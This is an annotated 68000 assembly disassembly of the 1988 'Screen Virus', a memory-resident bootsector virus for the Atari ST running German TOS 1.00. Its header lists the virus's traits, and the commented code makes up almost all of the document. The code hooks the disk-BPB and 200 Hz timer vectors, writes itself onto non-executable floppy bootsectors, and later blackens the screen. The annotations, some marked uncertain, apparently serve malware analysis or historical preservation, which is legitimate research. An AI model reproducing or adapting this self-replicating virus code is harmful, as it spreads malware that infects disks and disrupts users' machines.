; Name: Screen Virus.
; Type: Memory-resident bootsector virus.
; Discovery date: July 12th 1988 (Carsten Frischkorn).
; Virus can copy to drive(s): A.
; Virus attaches itself to: Hdv_bpb vector; 200 Hz System Clock vector; Etv_critic vector.
; What can happen: Screen is blackened.
; When does that happen: 54 minutes after virus installation.
; Reset-proof: No.
; Can copy to hard disk: No.
; Remark: Only works on 02.06.1986 ROMs (German TOS 1.00).

ETV_CRITIC          equ $404           ; $000404|long |GEM Critical error handler                           |etv_critic
PHYSTOP             equ $42E           ; $00042E|long |Physical top of RAM                                  |phystop
SCREENPT            equ $45E           ; $00045E|long |If not zero, points to video ram for next VBL        |screenpt
HZ_200              equ $4BA           ; $0004BA|long |Counter for 200hz system clock                       |_hz_200
V_BAS_AD            equ $44E           ; $00044E|long |Pointer to video RAM (logical screen base)           |_v_bas_ad
HDV_BPB             equ $472           ; $000472|long |Vector for getbpb for hard disk                      |hdv_bpb
TimerC              equ $114           ; $000114|ST-MFP-5 - Timer C (200hz Clock)                           |SD
TOS_DIAG_CHECK      equ $FC0026        ; TOS 1.0 diagnostics cart check routine
TOS_VERSION         equ $FC0018        ; TOS creation date
TOS_UNKNOWN         equ $FC2F78        ; ?
; TOS VERSIONS
; 1.00 us: 11 20 1985
; 1.00 de: 02 06 1986
; 1.02 us: 04 22 1987
; 1.04 us: 04 06 1989
; System calls
RWABS               equ $4                            ; rWabs() read and write disk sector:  long rwabs(int rwflag, long buffer, number, recno,dev)
PROTOBT             equ $12                           ; protobt() produce boot sector: void protobt(long buffer, serialno, int disktype, execflag)

; RAM locations
RWABS_BUFFER        equ $167A
OLD_HDV_BPB_VECTOR  equ JMP_TO_OLD_HDV_BPB_VECTOR+2
OLD_TIMER_C_VECTOR  equ JMP_TO_OLD_TIMER_C_VECTOR+2

START:
    ; check compatible TOS version
    CMPI.L      #$2061986,TOS_VERSION               ; check TOS version, only works for German TOS 1.0
    BNE.W       .not_supported_tos

    ; check virus in already in RAM
    MOVEA.L     PHYSTOP.W,A4
    CMPI.W      #$E656,$2(A4)                       ; check for a magic value? roxr ?
    BEQ.W       .already_installed

    ; define RAM location for bootsector buffer (PHYSTOP - $200 to PHYSTOP)
    LEA         -$200(A4),A4                        ; A4 = PHYSTOP - $200
    MOVE.L      A4,PHYSTOP.W                        ; Chaging PHYSTOP to A4 = PHYSTOP - $200 (I did not know it was R/W)

    ; define RAM location for video buffer
    LEA         -$8000(A4),A3                       ; A3 = PHYSTOP - $200 - $8000 (same location as Ghost!)
    MOVE.L      A3,SCREENPT.W                       ; Change screen ptr to this location for hte next VBL
    MOVE.W      #$8000,(A3)                         ; Set $8000 (32K) to SCREENPT?

    ; read bootsector and copy it to PHYSTOP - $200
    CLR.L       -(sp)                               ; dev=A | recno=0
    MOVE.W      #$1,-(sp)                           ; count=1
    PEA         (A4)                                ; buf in PHYSTOP - $200 => bootsector is copied from PHYSTOP - $200 to PHYSTOP
    MOVE.W      #$2,-(sp)                           ; rwflag=2 Disable retries mode
    MOVE.W      #$4,-(sp)                           ; RWABS: read bootsector
    TRAP        #13                                 ; 
    LEA         $E(sp),sp                           ; fix stack of 14 bytes
    CLR.L       SCREENPT.W                          ; Clear ptr to screen (reset to default?)
    JMP         TOS_DIAG_CHECK                      ; jump to the diagnostics cartidge check in TOS (https://github.com/th-otto/tos1x/blob/master/bios/startup.S#L201)
.already_installed:
    MOVEA.L     PHYSTOP.W,A4                        ; A4 = changed PHYSTOP.W => PHYSTOP - $200
    JSR         $84(A4)                             ; Jump to PHYSTOP.W - $200 + $84 = SETUP_VECTORS in Upper RAM
.not_supported_tos:
    RTS

; ----------------------------------------------------------------------------------------------------------
; 
; ----------------------------------------------------------------------------------------------------------      
; +0x5A + 0x20 (bootsector header) = +0x7A
WEIRD_ROUTINE:
    MOVE.W      D0,D1                               ; copy D0 to D1
    LSL.W       #8,D0                               ; D0 = D0*255
    LSR.W       #8,D1                               ; D1 = D0/255
    OR.W        D1,D0                               ; D0 = D0 | D1 ???
    RTS

; ----------------------------------------------------------------------------------------------------------
; SETUP_VECTORS, call by boot sector
; ----------------------------------------------------------------------------------------------------------      
; +0x64 + 0x20 (bootsector header) = +0x84
SETUP_VECTORS:
    MOVE        SR,-(sp)                            ; save stack register
    ANDI.L      #$FFFF0000,HZ_200.W                 ; keep only high nibble to round value to 327s (around 5 minutes)
    LEA         SCREEN_OFFSET(PC),A1
    MOVE.W      #$FFFC,(A1)                         ; store $FFFC in variable
    MOVE.W      #$2700,SR                           ; Set supervisor mode
      
    LEA         OLD_HDV_BPB_VECTOR(PC),A0           ; save old HDV_BPB_VECTOR
    MOVE.L      HDV_BPB.W,(A0)      

    LEA         HDV_BPB_VECTOR(PC),A0
    MOVE.L      A0,HDV_BPB.W                        ; and set new one

    LEA         OLD_TIMER_C_VECTOR(PC),A0           ; save old TIMER_C_VECTOR
    MOVE.L      TimerC.W,(A0)

    LEA         TIMER_C_VECTOR(PC),A0
    MOVE.L      A0,TimerC.W                         ; and set new one
    MOVE.W      (sp)+,SR                            ; retore stack register
    RTS

; ----------------------------------------------------------------------------------------------------------
; HDV_BPB_VECTOR, installed by bootsector
; ----------------------------------------------------------------------------------------------------------      
HDV_BPB_VECTOR:
    TST.W       $4(sp)                              ; Applications installing themselves here should expect parameters to be located on the stack as they would 
                                                    ; be for the actual function call beginning at 4(sp).
    BNE.W       JMP_TO_OLD_HDV_BPB_VECTOR

    LEA         RWABS_BUFFER.W,A4                   ; Load RWABS Reading buffer to A4    
    LEA         $ffffffe0(PC), A3                   ; Not clear.... A3 = @-32bytes => would be to LEA OLD_TIMER_C_VECTOR(PC),A0 but doesn't make sense..
    
    ; read bootsector
    CLR.L       -(sp)                               ; count=0 | dev=A
    MOVE.W      #$1,-(sp)                           ; recno = 1
    PEA         (A4)                                ; buf = RWABS_BUFFER
    MOVE.W      #$2,-(sp)                           ; rwflag
    MOVE.W      #$4,-(sp)                           ; RWABS
    TRAP        #13                                 ; 
    LEA         $E(sp),sp                           ; fix stack
    CLR.W       D0                                  ; clear error ?
    MOVEA.L     A4,A2                               ; Copy RWABS_BUFFER addr to A2
    MOVE.W      #$FF,D1                             ; for D1 = 255 to 0
.calc_checksum:
    ADD.W       (A2)+,D0                            ; compute word checksum                            
    DBF         D1,.calc_checksum
    CMPI.W      #$1234,D0                           ; check checksum
    BEQ.W       JMP_TO_OLD_HDV_BPB_VECTOR

    ; overwrite non executable bootsector only
    MOVEA.L     A4,A2                               ; it not executable, reset A2 = A4 = RWABS addr
    MOVE.L      (A3)+,(A2)+                         ; copy 8 first byte of DSKBUFP (601E...)
    MOVE.L      (A3)+,(A2)+                         ; 
    LEA         $16(A3),A3                          ; A3 = DSKBUFP + $8 + $16 = $1E (30)
    LEA         $16(A2),A2                          ; Same for A2
    MOVE.W      #$F0,D0                             ; for d0 = 240 to 0 (482 bytes)
.copy:
    MOVE.W      (A3)+,(A2)+                         ; copy 482 bytes from BOOTSECTOR to RWABS_BUFFER => 482 + 30 = 512
    DBF         D0,.copy
    MOVE.W      $1E(A4),D0                          ; exchange RWABS_BUFFER[0x1E] with RWABS_BUFFER[0x1FE]
    MOVE.W      $1FE(A4),$1E(A4)                    ; 
    MOVE.W      D0,$1FE(A4)                         ; 
    MOVE.W      #$1,-(sp)                           ; execflag: executable
    MOVE.W      #$FFFF,-(sp)                        ; disktype: -1 = unchanged
    PEA         $FFFFFFFF.W                         ; serial number
    PEA         (A4)                                ; buffer = RWABS_BUFFER
    MOVE.W      #PROTOBT,-(sp)                      ; XBIOS
    TRAP        #14                                 ; PROTOBT void protobt(long buffer, serialno, int disktype, execflag)
    LEA         $E(sp),sp                           ; fix stack

    MOVE.W      $1E(A4),D0                          ; exchange RWABS_BUFFER[0x1E] with RWABS_BUFFER[0x1FE]
    MOVE.W      $1FE(A4),$1E(A4)
    MOVE.W      D0,$1FE(A4)
    MOVE.L      ETV_CRITIC.W,D7                     ; Save ETV_CRITIC in D7
                                                    ; Critical error handler. Under GEM this pointer points to $2A156. 
                                                    ; There an attempt is made to correct disk errors, such as if a another disk is requested in a single-drive system.
    LEA         ETV_CRITIC_HANDLER(PC),A0
    MOVE.L      A0,ETV_CRITIC.W                     ; Set new critical error handler
    CLR.L       -(sp)                               ; dev=A | recno=0
    MOVE.W      #$1,-(sp)                           ; count=1
    PEA         (A4)                                ; buf = RWABS_BUFFER
    MOVE.W      #$3,-(sp)                           ; rwflag
    MOVE.W      #RWABS,-(sp)                        ; RWABS
    TRAP        #13                                 ; 
    LEA         $E(sp),sp                           ; fix stack
    CMPI.W      #$FFF3,D0                           ; check for BIOS error code -1 : GENERIC ERROR
    BEQ.W       .bios_error
.bios_error:
    MOVE.L      D7,ETV_CRITIC.W                     ; it boot sector cannot be read, reset old ETV_CRITIC vector
JMP_TO_OLD_HDV_BPB_VECTOR:
    JMP $FFFFFFFF                                   ; address will be patch with OLD_HDV_BPB_VECTOR

; ----------------------------------------------------------------------------------------------------------
; ETV_CRITIC_HANDLER, installed by HDV_BPB_VECTOR
; ----------------------------------------------------------------------------------------------------------          
ETV_CRITIC_HANDLER:                                   
    MOVE.W      $4(sp),D0                           ; put Gemdos error in d0
                                                    ; Critical Error Handler: 
                                                    ; This vector is used by the BIOS to service critical alerts (an Rwabs() disk error or media change request). 
                                                    ; When called, the WORD at 4(sp) is a GEMDOS error number
    RTS

; ----------------------------------------------------------------------------------------------------------
; TIMER_C_VECTOR, installed by bootsector
; ----------------------------------------------------------------------------------------------------------      
TIMER_C_VECTOR:
    MOVEM.W     D0/D1/A0/A1,-(sp)
    MOVE.L      HZ_200.W,D0                           ; _hz_200: This value is an ongoing counter for the internal 200Hz clock
    CMPI.L      #$57E40,D0                          ; if > 360000 ticks at 200hz (30 min)
    BLT.W       .not_yet                            ; 
    MOVEQ       #-1,D1                              ; then d1 = -1 = 0xFFFFFFFF
    MOVEA.L     V_BAS_AD.W,A0                       ; a0 = _v_bas_ad: This indicates the starting address of the
                                                    ; logical screen. Prior to TOS 1.06, this address
                                                    ; needed to be aligned on a 256 byte boundary
    LEA         SCREEN_OFFSET(PC),A1                ; a1 = SCREEN_OFFSET addr
    MOVE.W      (A1),D0                             ; d0.w = SCREEN_OFFSET[0]
    ADDQ.W      #4,D0                               ; d0 = d0 + 4
    CMPI.W      #$3E80,D0                           ; if D0 >= 16000
    BLT.W       .no_reset_yet           
    CLR.W       D0                                  ; d0 = 0
.no_reset_yet:                                      ; then 
    MOVE.W      D0,(A1)                             ; SCREEN_OFFSET[0] = d0
    MOVE.L      D1,$0(A0,D0.W)                      ; V_BAS_AD[d0] = 0xFFFFFFFF
    EORI.W      #$FFFC,D0                           ; D0 = D0 XOR 65532 ?
    LEA         $7D00(A0),A0                        
    MOVE.L      D1,$0(A0,D0.W)                      ; V_BAS_AD[d0+320000] = 0xFFFFFFFF
.not_yet:
    MOVEM.W     (sp)+,D0/D1/A0/A1
JMP_TO_OLD_TIMER_C_VECTOR:
    JMP         $FC2F78                             ; will be patch by OLD_TIMER_C_VECTOR

SCREEN_OFFSET:
    DC.W        $FFFC

UNKNOWN:
    DC.B        $00,$00,$00,$00,$E5,$E5 
    DC.B        $E5,$E5,$E5,$E5,$E5,$E5,$E5,$E5 
    DC.B        $E5,$E5,$E5,$E5,$E5,$E5,$E5,$E5 
    DC.B        $E5,$E5,$E5,$E5,$E5,$E5,$E5,$E5 
    DC.B        $E5,$E5,$E5,$E5,$E5,$E5,$E5,$E5 
    DC.B        $E5,$E5,$E5,$E5,$E5,$E5,$E5,$E5 
    DC.B        $E5,$E5,$E5,$E5,$E5,$E5,$7C,$75 
    DC.B        $8C,$04,$F9,$FF,$FF,$03,$40,$00 
    DC.B        $05,$60,$00,$07,$80,$00,$09,$A0 
    DC.B        $00,$0B,$F0,$FF 
